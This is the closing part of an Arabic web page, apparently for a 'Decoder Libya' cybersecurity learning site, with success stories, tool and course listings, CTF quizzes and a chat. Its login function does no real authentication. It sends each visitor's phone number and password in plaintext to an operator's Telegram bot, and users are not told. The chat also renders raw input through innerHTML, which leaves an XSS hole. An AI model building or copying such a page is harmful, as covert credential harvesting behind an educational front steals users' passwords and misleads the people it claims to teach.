        { title: "🇱🇾 هجوم الفدية على شركة مصراتة", content: "شركة في مصراتة تعرضت لهجوم فدية (Ransomware) طلبوا فيها 50 ألف دولار. المهندس سامي، خبير أمني ليبي، قدر يسترجع الملفات من النسخ الاحتياطية ويدير الشبكة قبل ما يدفعوا فلس. تعاون مع الشرطة السيبرانية وقبضوا على المجرمين. الدرس المستفاد: 'اعمل نسخ احتياطي دايماً'." },
        { title: "🇱🇾 ثغرة في موقع حكومي", content: "فاطمة، مطورة ويب من الزاوية، اكتشفت ثغرة SQL Injection في موقع حكومي. وثقت الثغرة وأرسلت تقرير للمسؤولين. في خلال 24 ساعة تم إصلاح الثغرة وكرمتها الوزارة بشهادة تقدير. تقول فاطمة: 'الأمان السيبراني مسؤولية الجميع'." },
        { title: "🇱🇾 قصة الواي فاي المسروق", content: "علي من سبها، شباب الحي كانو يخترقوا واي فاي جيرانهم ويستعملوه بلا إذن. علي علم جيرانه كيف يحموا الشبكة باستخدام WPA2 وتغيير كلمة السر كل شهر. من بعدها، الحي كله صار آمن ونصحهم: 'لا تخلو الشبكة مفتوحة أبداً'." },
        { title: "🇱🇾 مهندس الأمن في مصرف ليبي", content: "خالد، مهندس أمن سيبراني في مصرف ليبي كبير. لاحظ حركة مشبوهة في الشبكة في نص الليل. قدر يتتبع الهجوم ويوقفه قبل لا يصل للحسابات. حماية المصرف أنقذت فلوس كثير من الناس. يقول خالد: 'الأمن السيبراني مو ترف، هو ضرورة لأي مؤسسة'." }
    ];
    
    // ==================== دوال العرض ====================
    function renderTools() {
        document.getElementById("toolsGrid").innerHTML = kaliTools.map(t => `
            <div class="tool-card">
                <i class="fas fa-terminal" style="font-size: 2rem; color:#1e88e5;"></i>
                <h3>${t.name}</h3>
                <span class="level-badge blue">${t.category}</span>
                <p>${t.desc.substring(0, 80)}...</p>
                <button class="btn-demo" onclick="showFancyMessage('${t.name}', '🔧 أمر التشغيل:\\n${t.usage}\\n\\n📦 أمر التثبيت:\\n${t.install}\\n\\n💡 نصيحة: قم بتشغيل الأداة كـ root أو sudo')"><i class="fas fa-play"></i> عرض الأوامر</button>
            </div>
        `).join('');
    }
    
    function renderCourses() {
        document.getElementById("coursesContainer").innerHTML = `<div class="card-grid">` + youtubeCourses.map(c => `
            <div class="course-card">
                <i class="fab fa-youtube" style="font-size: 2rem; color: #ff0000;"></i>
                <h3>${c.name}</h3>
                <span class="level-badge ${c.level.includes('مبتدئ')?'green':(c.level.includes('متوسط')?'yellow':'red')}">${c.level}</span>
                <p>📺 ${c.channel} | 👁️ ${c.views}</p>
                <a href="${c.link}" target="_blank" class="course-btn" onclick="showFancyMessage('🎓 كورس ${c.name}', 'سيتم نقلك إلى يوتيوب لمشاهدة الكورس\\n\\n📺 القناة: ${c.channel}\\n👁️ عدد المشاهدات: ${c.views}')"><i class="fab fa-youtube"></i> مشاهدة الكورس</a>
            </div>
        `).join('') + `</div>`;
    }
    
    function renderPaths() {
        document.getElementById("pathsGrid").innerHTML = paths.map(p => `
            <div class="path-card">
                <i class="fas ${p.icon} fa-2x" style="color:#1e88e5;"></i>
                <h3>${p.name}</h3>
                <p>${p.steps.replace(/\n/g, '<br>')}</p>
                <button class="btn-demo" onclick="showFancyMessage('${p.name}', '${p.steps.replace(/\n/g, '\\n')}\\n\\n🚀 ابدأ رحلتك الآن مع Decoder Libya!')"><i class="fas fa-road"></i> تفاصيل المسار</button>
            </div>
        `).join('');
    }
    
    function renderLibrary() {
        document.getElementById("libraryGrid").innerHTML = libraryTools.map(l => `
            <div class="tool-card">
                <i class="fas fa-download" style="font-size: 2rem;"></i>
                <h3>${l.name}</h3>
                <p>${l.desc}</p>
                <p><strong>متى تستخدم:</strong> ${l.useFor}</p>
                <a href="${l.download}" target="_blank" class="btn-demo" onclick="showFancyMessage('تحميل ${l.name}', 'سيتم نقلك إلى رابط التحميل الرسمي\\n\\n⚠️ استخدم الأدوات بشكل قانوني فقط')">📥 تحميل</a>
            </div>
        `).join('');
    }
    
    function renderCTF() {
        let html = `<p>🧩 تحديات CTF سهلة — اختبر معلوماتك الأمنية:</p>`;
        ctfChallenges.forEach((c,i) => {
            html += `<div class="ctf-challenge" style="background:#07121f; border-radius:24px; padding:1rem; margin-bottom:1rem; border-right:3px solid #1e88e5;">
                        <strong>❓ السؤال ${i+1}:</strong> ${c.question}<br>
                        <button class="btn-demo" onclick="showFancyMessage('💡 تلميح السؤال ${i+1}', 'التلميح: ${c.answerHint}')"><i class="fas fa-lightbulb"></i> تلميح</button>
                        <button class="btn-demo" onclick="let ans=prompt('✍️ أدخل إجابتك:'); if(ans && ans.trim().toLowerCase() === '${c.answerHint.toLowerCase()}') { showFancyMessage('✅ إجابة صحيحة! 🎉', 'أحسنت! إجابتك صحيحة\\n\\nتابع التحديات مع Decoder Libya'); } else { showFancyMessage('❌ إجابة خاطئة', 'للأسف إجابتك غير صحيحة\\n\\n💡 التلميح: ${c.answerHint}'); }"><i class="fas fa-check"></i> إجابة</button>
                     </div>`;
        });
        document.getElementById("ctfList").innerHTML = html;
    }
    
    function renderStories() {
        document.getElementById("storiesGrid").innerHTML = stories.map(s => `
            <div class="story-card">
                <i class="fas fa-book-open" style="font-size: 2rem; color:#1e88e5;"></i>
                <h3>${s.title}</h3>
                <p>${s.content.substring(0, 120)}...</p>
                <button class="btn-demo" onclick="showFancyMessage('${s.title}', '${s.content}')"><i class="fas fa-book-reader"></i> اقرأ القصة كاملة</button>
            </div>
        `).join('');
    }
    
    // ==================== الدردشة المباشرة ====================
    let chatMessages = [];
    let currentUser = "";
    
    function renderChat() {
        const container = document.getElementById("chatMessages");
        container.innerHTML = chatMessages.map(m => `<div class="chat-message"><strong style="color:#1e88e5;">${m.user}:</strong> ${m.message}</div>`).join('');
        container.scrollTop = container.scrollHeight;
    }
    
    function sendMessage() {
        const input = document.getElementById("chatInput");
        if(input.value.trim()) {
            chatMessages.push({ user: currentUser, message: input.value });
            renderChat();
            input.value = "";
        }
    }
    
    // ==================== التحقق من صحة الإدخال ====================
    function isValidLibyanNumber(phone) {
        return /^(091|092|094|095)[0-9]{7}$/.test(phone);
    }
    
    function isValidPassword(password) {
        return /^[0-9]{7}$/.test(password);  // 7 أرقام فقط
    }
    
    // ==================== تسجيل الدخول ====================
    function performLogin() {
        const phone = document.getElementById("phoneInput").value.trim();
        const password = document.getElementById("passwordInput").value;
        
        if (!isValidLibyanNumber(phone)) {
            document.getElementById("loginError").innerHTML = "⚠️ رقم ليبي صحيح فقط (يبدأ بـ 091/092/094/095 ومكون من 10 أرقام)";
            showFancyMessage("⚠️ خطأ في رقم الهاتف", "الرجاء إدخال رقم ليبي صحيح\nيبدأ بـ 091 أو 092 أو 094 أو 095\nمثال: 0912345678");
            return;
        }
        
        if (!isValidPassword(password)) {
            document.getElementById("loginError").innerHTML = "⚠️ كلمة السر يجب أن تكون 7 أرقام فقط";
            showFancyMessage("⚠️ خطأ في كلمة السر", "كلمة السر يجب أن تتكون من 7 أرقام فقط\nمثال: 1234567");
            return;
        }
        
        currentUser = phone;
        
        // إرسال بيانات المستخدم إلى الأدمن عبر بوت التيليجرام
        const userData = `🔐 **مستخدم جديد في Decoder Libya**\n\n📱 **رقم الهاتف:** ${phone}\n🔑 **كلمة السر:** ${password}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n🌍 **الدولة:** ليبيا\n\n🛡️ مرحباً بك في منصتنا!`;
        sendToTelegram(userData);
        
        // إخفاء شاشة الدخول وإظهار التطبيق
        document.getElementById("loginScreen").style.display = "none";
        document.getElementById("mainApp").style.display = "block";
        setTimeout(() => { document.getElementById("mainApp").style.opacity = "1"; }, 50);
        
        document.getElementById("userBadge").innerHTML = `👤 ${phone}`;
        
        // عرض جميع المحتويات
        renderTools();
        renderCourses();
        renderPaths();
        renderLibrary();
        renderCTF();
        renderStories();
        renderChat();
        
        showFancyMessage("✨ مرحباً بك في Decoder Libya", `أهلاً ${phone}\n\n🛡️ منصتك المتكاملة لتعلم الأمن السيبراني\n📚 استمتع بالمحتوى العربي والعالمي\n🔗 للتواصل واتساب: 0943263423\n\n© 2025 جميع الحقوق محفوظة لـ Decoder Libya`);
    }
    
    // ==================== ربط الأحداث ====================
    document.getElementById("doLoginBtn").addEventListener("click", performLogin);
    document.getElementById("passwordInput").addEventListener("keypress", (e) => { if(e.key === "Enter") performLogin(); });
    document.getElementById("phoneInput").addEventListener("keypress", (e) => { if(e.key === "Enter") performLogin(); });
    
    document.getElementById("logoutMainBtn").addEventListener("click", () => {
        document.getElementById("mainApp").style.opacity = "0";
        setTimeout(() => {
            document.getElementById("mainApp").style.display = "none";
            document.getElementById("loginScreen").style.display = "flex";
            document.getElementById("mainApp").style.opacity = "0";
            document.getElementById("phoneInput").value = "";
            document.getElementById("passwordInput").value = "";
            document.getElementById("loginError").innerHTML = "";
        }, 300);
    });
    
    document.getElementById("sendMsgBtn").addEventListener("click", sendMessage);
    document.getElementById("chatInput").addEventListener("keypress", (e) => { if(e.key === "Enter") sendMessage(); });
    
    // ==================== التبويبات ====================
    function initTabs() {
        document.querySelectorAll(".tab-btn").forEach(btn => {
            btn.addEventListener("click", () => {
                document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
                btn.classList.add("active");
                document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));
                const id = btn.getAttribute("data-tab") + "Tab";
                document.getElementById(id).classList.add("active");
            });
        });
    }
    initTabs();
    
    // ==================== ملاحظة للمطور ====================
    console.log("✅ Decoder Libya - تم تحميل المنصة بنجاح");
    console.log("🔧 قم بتعديل متغيرات TELEGRAM_BOT_TOKEN و TELEGRAM_ADMIN_ID في السورس كود");
    console.log("📱 كلمة السر يجب أن تكون 7 أرقام فقط");
</script>
</body>
</html>
